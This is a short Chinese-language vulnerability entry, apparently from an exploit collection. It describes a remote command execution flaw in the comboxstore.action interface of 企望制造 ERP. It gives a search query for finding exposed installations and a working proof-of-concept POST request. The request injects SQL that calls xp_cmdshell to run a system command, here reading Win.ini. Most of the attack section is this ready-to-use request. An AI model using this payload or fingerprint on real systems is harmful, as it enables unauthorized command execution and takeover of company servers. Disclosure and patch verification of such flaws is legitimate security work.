# 企望制造 ERP comboxstore.action 远程命令执行漏洞

## 漏洞描述

企望制造 ERP comboxstore.action接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令

## 漏洞影响

<a-checkbox checked>企望制造 ERP </a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="企望制造ERP系统"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691818989927-dac8d740-682d-400c-a5c9-4c3cc5d53304.png)

验证POC

```php
POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
```

![img](../../../.vuepress/public/img/1691819017786-426f8cd5-38b7-4c1c-91de-912c1b5a68fb.png)